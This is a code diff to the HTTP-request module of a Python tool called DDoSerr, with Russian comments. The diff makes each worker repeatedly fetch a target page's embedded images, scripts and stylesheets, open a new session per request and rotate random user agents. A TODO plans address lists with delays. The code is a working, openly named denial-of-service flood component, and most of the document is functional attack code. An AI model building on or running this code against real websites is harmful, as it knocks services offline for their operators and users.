@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.1.3b. от 02.08.2018.
+v.1.6.2.12b. от 22.08.2018.
 """
 
 """
@@ -73,6 +73,7 @@ v.1.6.1.3b. от 02.08.2018.
 
 #Используем библиотеку requests.
 import requests
+#from requests import Request, Session
 #Подключаем модуль времени.
 import time
 #Подключаем модуль взаимодействия с системой.
@@ -91,105 +92,153 @@ format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')
 
 
 def http_connection(repeat, pause, url):
+    #Если не задаётся извне значение url, то берётся указанное.
     #(repeat, pause, url="http://127.0.0.1")
+    
     """
     Функция для создания 1 процесса, запросов к сайту и получения ответа.
-    Подгружает контент.
+    Подгружает контент со страницы (картинки, java-скрипты, CSS стили).
     """
-    #Если не задаётся извне значение url, то берётся указанное.
-    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    #!Добавить в аргументы user_agent!
-    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    
     
     #!Вызов парсера странцы и получение списка ссылок 
     #на подгружаемый контент.
-    #Возможно, надо будет засунуть в цикл. Или нет.
     content_urls = html_parser.obj_search(url)
+    #Возможно, надо будет засунуть в цикл. Или нет.
+    
 
     #Цикл выполняет задание 'repeat' раз в каждом процессе.
     for _ in range(repeat):
         #Создаём сессию.
-        session = requests.Session()
+        ##session = requests.Session()
         
         #Вызываем модуль агентов и получаем рандомного агента из списка.
         random_agent = user_agents.Agents().random_agent()
         
-        #Отправляем один запрос к заглавной странице.
+        """
+        #Отправляем один запрос к заглавной странице. Не актуально, но работало.
         #main_page = session.get(url, stream=True)
         
         #Для post запросов, пригодится в будущем.
         #main_page = requests.post("http://httpbin.org/post")
-        
-        """
-        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-        !Сделать цикл(ы) для запросов!
-        !Добавить выбор рандомного юзер агента. Переделать headers!
-        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         """
         
-        #---
-        #Отладка.
-        #print(content_urls)
-        #---
+        """
+        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        Сделать цикл для запросов. - Выполнено.
+        Добавить выбор рандомного юзер агента. - Выполнено.
+        Заставить работать сессию с юзер агенторм - Переделать headers. - Выполнено.
+        !Сделать модуль для обхода страниц с задержками!
+        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        """
         
-        #!!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         #!Запрос контента со страницы по найденным ссылкам.
-        #!Возможно, цикл неправильный и даже не нужен...
-        #!Пока цикл не работает.
-        for item in range(len(content_urls)):
-            #Это задумывалось как система прохода по списку ссылок 
-            #на контент для его подгрузки.
+
+        for _ in range(len(content_urls)):
+            #Система прохода по списку ссылок на контент для его подгрузки.
             #И всё это должно подгружаться сразу, для каждой сессии,
-            #поэтому нужен отдельный цикл внутри задания... Наверное.
+            #поэтому нужен отдельный цикл внутри задания.
             
-            current_url = content_urls[item]
-            #current_url = str(content_urls[item])
+            #Контент подгружается по одному элементу, 
+            #долго на слабой машине.
             
-            #!С юзер агентом. Пока не работает совсем.
-            ##headers = {random_agent}
-            ##content_main_page = session.get(current_url, headers=headers)
+            #_ или item.
+            current_url = content_urls[_]
             
+            #Создаём новую сессию для каждого запроса.
+            session = requests.Session()
+            
+            #Содаём подготовленный запрос с юзер агентом.
+            
+            ##content_on_page = session.get(current_url, headers={random_agent}, verify=False)
+            
+            
+            ###headers = {random_agent}
+            
+            req = requests.Request('GET', current_url, \
+            headers={'User-Agent': random_agent})
+            
+            prepped = session.prepare_request(req)
+            
+            ##prepped.headers['User-Agent'] = random_agent
+            
+            content_on_page = session.send(prepped)
+            
+            
+            """
+            request = Request('GET', current_url, data=data, \
+            headers=headers)
+            
+            prepped = session.prepare_request(request)
+            
+            prepped.headers['User-Agent'] = random_agent
+            
+            content_on_page = session.send(prepped,
+                            stream=stream,
+                            verify=verify,
+                            proxies=proxies,
+                            cert=cert,
+                            timeout=timeout
+            )
+            """
+            
+            """
+            #Не так надо.
+            ##!!!С юзер агентом. Пока не работает совсем.
+            headers = {random_agent}
+            content_on_page = session.get(current_url, headers=headers)
+            """
             #---
-            #Проблема с заданием юзер агента. Без него работает. Но криво.
-            content_main_page = session.get(current_url)
+            #Без юзер агента.
+            ##content_on_page = session.get(current_url)
             #---
             
-            #!!!Это работает не так, как надо! 
-            #Делается 'repeat' запросов только на первый адрес.
-        
-        
-        #Для main_page.
-        #Код возврата.
-        #status = str(main_page.status_code)
-        #Размер ответа, большой ответ разбивается на куски по 8196 Байт.
-        #size = str(sum(len(chunk) for chunk in main_page.iter_content(8196)))
-        
-        #Код возврата.
-        status = str(content_main_page.status_code)
-        #Размер ответа, большой ответ разбивается на куски по 8196 Байт.
-        size = str(sum(len(chunk) for chunk in content_main_page.iter_content(8196)))
-        
-        #Этот вывод результата можно убрать для повышения производительности.
-        print(status, size)
-        
-        answer = str("code " + status + "," + '\t' + "size " + size)
-        
-        #Логгируем запуск процесса с его PID.
-        logging.info('Process ' + str(os.getpid()) + ' received the task.')
-        #Логгируем результаты.
-        logging.info('URL: ' + current_url)
-        logging.info('Answer: ' + answer)
         #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        
+            """
+            #Не актуально.
+            #Для main_page.
+            #Код возврата.
+            #status = str(main_page.status_code)
+            #Размер ответа, большой ответ разбивается на куски по 8196 Байт.
+            #size = str(sum(len(chunk) for chunk in main_page.iter_content(8196)))
+            """
+            
+            #Получение информации по контенту.
+            
+            #Код возврата.
+            status = str(content_on_page.status_code)
+            #Размер ответа. Большой ответ разбивается на куски по 8196 Байт.
+            size = str(sum(len(chunk) for chunk in content_on_page.iter_content(8196)))
+        
+            #Этот вывод результата (для наглядности работы и отладки)
+            #можно убрать для небольшого повышения производительности.
+            print(status, size)
+        
+            answer = str("code " + status + "," + '\t' + "size " + size +\
+            " bytes")
+        
+            #Логгируем запуск процесса с его PID.
+            logging.info('Process ' + str(os.getpid()) + ' received the task.')
+            #Логгируем результаты.
+            logging.info('URL: ' + current_url)
+            logging.info('Answer: ' + answer)
+        
+        
         #Задержка перед повтором цикла.
         time.sleep(pause)
+        
+    #Закрываем файл юзер агентов.
+    agents_close = user_agents.Agents().agents_close()
         
 
 
 """
-!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 !Вместо url надо сделать список адресов с задерками.
-!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+!Организовать в отдельном модуле и вставить между основноы программой и
+этим модулем.
+!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 """
 
 
